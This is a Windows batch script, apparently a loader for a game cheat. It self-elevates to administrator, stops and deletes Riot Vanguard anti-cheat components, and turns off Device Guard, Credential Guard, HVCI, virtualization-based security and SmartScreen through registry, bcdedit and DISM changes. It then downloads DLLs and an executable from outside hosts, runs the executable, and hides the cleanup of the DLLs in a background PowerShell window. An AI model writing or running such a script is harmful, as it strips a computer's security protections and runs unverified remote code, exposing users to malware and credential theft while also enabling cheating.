��&cls
@echo off
setlocal enabledelayedexpansion

:: Check for administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Not running as administrator. Restarting with elevated privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Server address (not echoed for security)
set "SERVER=http://38.3.137.77/batvers"

:: Get Windows version (e.g. 10.0.26100.4770)
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Version"`) do (
    set "version=%%a"
)

:: Get UBR (Update Build Revision)
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').UBR"`) do set "ubr=%%a"
if "!ubr!"=="" set "ubr=0"

:: Construct full local version
set "local_version=!version!.!ubr!"
set "local_version=!local_version: =!"

:: Extract build number (3rd token)
for /f "tokens=3 delims=." %%b in ("!version!") do set "build=%%b"
set /a buildnum=!build!

:: Block Windows 11 users
if !buildnum! GEQ 22000 (
    echo.
    echo ============================================================
    echo [ERROR] Windows 11 is NOT supported.
    echo [ERROR] This script only works on Windows 10.
    echo [ERROR] Please install Windows 10 and try again.
    echo ============================================================
    echo.
    pause
    exit /b 1
)

:: Windows 10 confirmed - use win10 version file
set "version_file=win10.txt"

:: Define temporary file path
set "temp_file=%temp%\version_check.txt"

:: Download version list from server with correct MIME type
powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%SERVER%/!version_file!' -OutFile '%temp_file%' -Headers @{ 'Accept' = 'application/octet-stream' }"
if errorlevel 1 (
    echo [ERROR] Failed to download version file.
    pause
    exit /b 1
)



:: Check local version against all allowed remote versions
set "version_match=false"
for /f "usebackq tokens=* delims=" %%a in ("%temp_file%") do (
    set "remote_version=%%a"
    set "remote_version=!remote_version: =!"
    if "!local_version!"=="!remote_version!" (
        set "version_match=true"
    )
)

if "!version_match!"=="true" (
    echo [OK] Windows version is up to date. Continuing...
) else (
    echo [WARNING] Please install the latest Windows updates and restart your computer.
    pause
    exit /b 1
)

:: Determine OS version for logging
for /f "tokens=2 delims=[]" %%i in ('ver') do set ver=%%i
for /f "tokens=1,2,3 delims=." %%a in ("%ver%") do set build=%%c
if !build! LSS 22000 (set osver=Windows 10) else (set osver=Windows 11)
echo [OK] Detected operating system: !osver!
echo.



:: Admin confirmation and OS output
REM echo [OK] Script is running with administrator privileges.
REM echo [OK] Detected OS: %osver%
echo.

:: ===== VIRTUALIZATION CHECK (Intel + AMD, W10 & W11) =====
echo [*] Checking CPU Virtualization status...
set "virt_status=skip"

REM --- Method 1: Is a hypervisor running? (if yes, VT-x/SVM is definitely ON) ---
for /f "usebackq delims=" %%a in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "try { if ((Get-CimInstance Win32_ComputerSystem).HypervisorPresent) { 'enabled' } else { 'unknown' } } catch { 'skip' }"`) do set "virt_status=%%a"

REM --- Method 2: Firmware (BIOS) status - locale-independent, reliable on Intel ---
if not "!virt_status!"=="enabled" (
    for /f "usebackq delims=" %%a in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $wmi = Get-WmiObject Win32_ComputerSystem; if ($wmi.HypervisorPresent) { 'enabled' } else { 'disabled' } } catch { 'disabled' }"`) do set "virt_status=%%a"
)

if "!virt_status!"=="disabled" (
    echo [OK] CPU Virtualization is DISABLED - Confirmed. Continuing...
) else if "!virt_status!"=="enabled" (
    echo [ERROR] Virtualization is currently ENABLED.
    echo [ERROR] Please enter your BIOS/UEFI and DISABLE Virtualization ^(Intel VT-x / AMD SVM^), then run this again.
    pause
    exit /b 1
) else (
    echo [ERROR] Please enter your BIOS/UEFI, make sure Virtualization is DISABLED, then run this again.
    pause
    exit /b 1
)
echo.

:: ===== SECUREBOOT CHECK (W10 & W11 Compatible) =====
echo [*] Checking SecureBoot status...

set "secureboot_status=skip"

REM Method 1: Registry check (Works W10+W11)
for /f "tokens=3" %%a in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State" /v UEFISecureBootEnabled 2^>nul') do (
    if "%%a"=="0x1" set "secureboot_status=enabled"
    if "%%a"=="0x0" set "secureboot_status=disabled"
)

REM Method 2: BCDEdit check (Works W10+W11)
if "!secureboot_status!"=="skip" (
    for /f "tokens=*" %%a in ('bcdedit /enum 2^>nul ^| find /i "secureboot"') do (
        if not "%%a"=="" (
            echo %%a | find /i "yes" >nul 2>&1 && set "secureboot_status=enabled"
            echo %%a | find /i "no" >nul 2>&1 && set "secureboot_status=disabled"
        )
    )
)

REM Method 3: PowerShell Get-SecureBootUEFI (W10+W11)
if "!secureboot_status!"=="skip" (
    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "try { if (Get-SecureBootUEFI -ErrorAction Stop) { Write-Output 'enabled' } else { Write-Output 'disabled' } } catch { Write-Output 'skip' }" 2^>nul`) do (
        if "%%a"=="enabled" set "secureboot_status=enabled"
        if "%%a"=="disabled" set "secureboot_status=disabled"
    )
)

if "!secureboot_status!"=="enabled" (
    echo [ERROR] SecureBoot is ENABLED. Must be DISABLED.
    echo [INFO] Disable in BIOS: Boot/Security section
    echo [INFO] Find option: Secure Boot
    echo [INFO] Change to: DISABLED
    pause
    exit /b 1
) else if "!secureboot_status!"=="disabled" (
    echo [OK] SecureBoot is DISABLED - Confirmed
) else (
    echo [INFO] SecureBoot status could not be determined
    echo [INFO] Assuming DISABLED - proceeding...
    set "secureboot_status=disabled"
)
echo.

@echo off
setlocal enabledelayedexpansion

REM ===== Administrator check / self-elevation =====
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)


powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ProcessMitigation -System -Reset"
echo.



:script_setup
echo [^>] Running Script Setup on %osver%...
echo.

echo [+] Checking if vgk driver is installed...
sc query vgk >nul 2>&1
if %errorlevel% neq 0 (
    echo [+] vgk driver is not installed. Continuing without stopping driver...
    goto continue_processing
)

:: Check if vgk driver is running
sc query vgk | find "RUNNING" >nul
if %errorlevel% equ 0 (
    echo [+] vgk driver is running. Stopping it...
    sc stop vgk >nul

    :: Wait for driver to stop
    set "counter=0"
    :CheckStatus
    set /a counter+=1
    if !counter! GTR 5 (
        echo [-] Driver did not stop after 5 attempts. Exiting...
        exit /b
    )
    timeout /t 5 /nobreak >nul
    sc query vgk | find "STOPPED" >nul || goto CheckStatus
    echo [+] Driver stopped successfully.
)

:continue_processing
echo [+] Continuing with the rest of the script...
:: Add your additional processing code here

powershell -NoProfile -Command "Get-ChildItem -LiteralPath ($env:LOCALAPPDATA + '\Discord') -Recurse -File -Filter DiscordHook64.dll -ErrorAction SilentlyContinue | ForEach-Object { icacls $_.FullName /deny '*S-1-1-0:(RX)' }" >nul 2>&1

:: Kill Riot processes
echo [+] Terminating Riot processes...
taskkill /IM "vgtray.exe" /F >nul 2>&1
taskkill /IM "vgc.exe" /F >nul 2>&1
taskkill /IM "League of Legends.exe" /F >nul 2>&1
taskkill /IM "Riot Client.exe" /F >nul 2>&1
taskkill /IM "RiotClientCrashHandler.exe" /F >nul 2>&1
taskkill /IM "RiotClientServices.exe" /F >nul 2>&1

:: Delete Vanguard files
echo [+] Deleting files...
del /f /q "C:\Windows\vgkbootstatus.dat" >nul 2>&1
del /f /q "C:\Windows\392667600.dat" >nul 2>&1

if exist "C:\Windows\vgkbootstatus.dat" (
    echo [-]  was NOT deleted.
) else (
    echo [+]  deleted successfully.
)

if exist "C:\Windows\392667600.dat" (
    echo [-]  was NOT deleted.
) else (
    echo [+]  deleted successfully.
)

:: Registry Changes
echo [+] Applying registry modifications...

:: Disable Device Guard and related security features
echo     - Disabling...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "CachedDrtmAuthIndex" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequireMicrosoftSignedBootChain" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "WasEnabledBy" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "HyperVVirtualizationBasedSecurityOptout" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "Locked" /t REG_DWORD /d 0 /f

:: Disable SystemGuard, CredentialGuard, HVCI, etc.
echo     - Disabling...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios" /v "SystemGuard" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard" /v "Enabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "HVCIMATRequired" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Locked" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "EnabledBootId" /t REG_DWORD /d 34 /f

:: Disable KernelShadowStacks and KeyGuard
echo     - Disabling...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KernelShadowStacks" /v "AuditModeEnabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KernelShadowStacks" /v "Enabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KernelShadowStacks" /v "WasEnabledBy" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard" /v "Enabled" /t REG_DWORD /d 0 /f

:: Disable KeyGuard Status flags
echo     - Disabling...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "IsSecureKernelRunning" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "EncryptionKeyAvailable" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "EncryptionKeyPersistent" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "SecretsMode" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "IsTestConfig" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "KeyGuardEnabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "CredGuardEnabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "LsaIsoLaunchAttempted" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "LsaIsoLaunchError" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "ExecSystemProcessesError" /t REG_DWORD /d 0xc0000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "NumAttemptedRestarts" /t REG_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\KeyGuard\Status" /v "NumSuccessfulRestarts" /t REG_DWORD /d 0 /f

:: Disable SystemGuard and WindowsHello
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /v "Enabled" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\WindowsHello" /v "Enabled" /t REG_DWORD /d 0 /f

:: CldFlt services stop
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CldFlt" /v Start /t REG_DWORD /d 4 /f

:: Disable Virtualization-Based Security
echo [+] Disabling...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f

:: LsaCfgFlags
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f

:: Disable Microsoft Edge SmartScreen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge" /v SafeBrowsingEnabled /t REG_DWORD /d 0 /f

:: Disable Microsoft Defender SmartScreen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v SmartScreenEnabled /t REG_DWORD /d 0 /f

:: Disable Application Security (SmartScreen)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f

:: Disable SmartScreen for Microsoft Store apps
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsStore" /v DisableSmartScreen /t REG_DWORD /d 1 /f

echo disabled.

echo [+] Registry changes applied.

:: ===== CRITICAL REGISTRY DELETIONS =====
echo [+] Applying critical security deletions...

REM DeviceGuard Registry complete deletion
echo     - Removing DeviceGuard registry...
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] DeviceGuard registry deleted.
) else (
    echo [!] DeviceGuard registry deletion skipped.
)

REM LSA LsaCfgFlags deletion
echo     - Removing LSA configuration...
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] LSA LsaCfgFlags deleted.
) else (
    echo [!] LSA LsaCfgFlags deletion skipped.
)

echo [+] Critical deletions completed.
echo.

:: ===== BOOT CONFIGURATION MODIFICATIONS =====
echo [+] Modifying boot configuration...

REM Disable Hyper-V launcher
echo     - Setting hypervisorlaunchtype to off...
bcdedit /set hypervisorlaunchtype off >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Hypervisor launch type disabled.
) else (
    echo [!] Hypervisor launch type modification skipped.
)

REM Disable VSM launcher
echo     - Setting vsmlaunchtype to off...
bcdedit /set vsmlaunchtype off >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] VSM launch type disabled.
) else (
    echo [!] VSM launch type modification skipped.
)

echo [+] Boot configuration completed.
echo.

:: ===== DISABLE HYPER-V FEATURE =====
echo [+] Disabling Hyper-V feature...

REM Disable Hyper-V feature using DISM
DISM /Online /Disable-Feature /FeatureName:Microsoft-Hyper-V /All /NoRestart >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Hyper-V feature disabled successfully.
) else (
    echo [!] Hyper-V feature disable skipped or already disabled.
)


:: Download the file silently (without showing URL)
echo [+] Downloading required file...

:: === DLL indirme (GitHub Public Repo -> bat'in oldugu klasore) ===
set "ScriptDir=%~dp0"

echo [+] Downloading symsrv.dll...
curl -L -f -s -S "https://raw.githubusercontent.com/sayspayment/dlls/main/symsrv.dll" -o "%ScriptDir%symsrv.dll"
if not exist "%ScriptDir%symsrv.dll" ( echo [-] symsrv.dll download failed & pause & exit /b )
for %%A in ("%ScriptDir%symsrv.dll") do if %%~zA LSS 10000 ( echo [-] symsrv.dll is corrupt & del "%ScriptDir%symsrv.dll" & pause & exit /b )

echo [+] Downloading dbghelp.dll...
curl -L -f -s -S "https://raw.githubusercontent.com/sayspayment/dlls/main/dbghelp.dll" -o "%ScriptDir%dbghelp.dll"
if not exist "%ScriptDir%dbghelp.dll" ( echo [-] dbghelp.dll download failed & pause & exit /b )
for %%A in ("%ScriptDir%dbghelp.dll") do if %%~zA LSS 10000 ( echo [-] dbghelp.dll is corrupt & del "%ScriptDir%dbghelp.dll" & pause & exit /b )

echo [+] Downloading srcsrv.dll...
curl -L -f -s -S "https://raw.githubusercontent.com/sayspayment/dlls/main/srcsrv.dll" -o "%ScriptDir%srcsrv.dll"
if not exist "%ScriptDir%srcsrv.dll" ( echo [-] srcsrv.dll download failed & pause & exit /b )
for %%A in ("%ScriptDir%srcsrv.dll") do if %%~zA LSS 10000 ( echo [-] srcsrv.dll is corrupt & del "%ScriptDir%srcsrv.dll" & pause & exit /b )

echo [+] All DLLs downloaded.

:: === EXE indirme (senin calisan orjinal versiyonun) ===
:: Download the file
echo [+] Downloading the file...
set "URL=http://api.nyrex.vip//version//download.php?version=3"
set "Extension=.exe"
set "RandomNumber=%RANDOM%"
set "OutputName=%ScriptDir%%RandomNumber%%Extension%"  :: Indirilen dosyanin ayni dizine kaydedilmesi

curl -A "A WinHTTP Example Program/1.0" --http1.1 "%URL%" -o "%OutputName%"
if exist "%OutputName%" (
    echo [+] Download complete. File saved as: %OutputName%

    :: Calistirmadan once script'in bulundugu dizine gecis yapiyoruz
    cd /d "%ScriptDir%"

    :: Simdi exe dosyasini script'in bulundugu dizinden calistiriyoruz
    start "" "%OutputName%"

    :: Arka planda gizli PowerShell: exe kapanmasini bekle, DLL'leri sil
    start "" powershell -WindowStyle Hidden -Command "Start-Sleep 2; $p = Get-Process -Name '%RandomNumber%' -ErrorAction SilentlyContinue; if ($p) { $p.WaitForExit() }; Remove-Item '%ScriptDir%symsrv.dll','%ScriptDir%dbghelp.dll','%ScriptDir%srcsrv.dll' -Force -ErrorAction SilentlyContinue"
) else (
    echo [-] Download failed.
)

echo.
echo [OK] Script Setup completed for %osver%.


exit /b



endlocal